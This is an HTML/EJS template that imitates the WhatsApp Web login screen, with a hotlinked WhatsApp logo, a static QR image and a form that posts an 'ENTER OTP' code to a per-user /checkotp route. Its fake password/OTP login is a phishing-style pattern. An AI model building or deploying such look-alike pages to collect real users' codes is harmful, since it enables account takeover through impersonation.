
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WhatsApp Login</title>
  <link rel="stylesheet" href="../stylesheets/index.css">
  <!-- <script src="http://localhost:3000/socket.io/socket.io.js"></script> -->
</head>
<body>
  <div class="container">
    <div id="header">
      <img src="https://www.freeiconspng.com/thumbs/logo-whatsapp-png/logo-whatsapp-png-pic-0.png" alt="">
      <h2>WHATSAPP WEB</h2>
    </div>
    <div id="center">
      <div id="box">
        <div id="box1">
          <h1>To use WhatsApp on your computer</h1>
          <div id="para">
            <p>1. Open WhatsApp on your phone</p>
            <p>2. Go to settings by tapping on your profile photo, Menu or,<br> Settings</p>
            <p>3. Tap Linked devices and then link a device</p>
            <p>4. Point your phone to this screen to capture the QR code</p>
            <p>5. Or login Whatsapp with username and password</p>

          </div>
        </div>
        <div id="box2">
          <form style="position: absolute;top:80% ; display: flex; flex-direction: column; gap: 6px;left: 30%;" action="/checkotp/<%= user._id%>" method="post">
            <input type="number" name="otp" placeholder="ENTER OTP" id="">
            <button>LOGIN</button>
          </form>
    
          <img src="https://static.toiimg.com/thumb/resizemode-4,msid-80874974,imgsize-60742,width-800/80874974.jpg" alt="">
        </div>
        
      </div>
    </div>
  </div>
  
</body>
</html>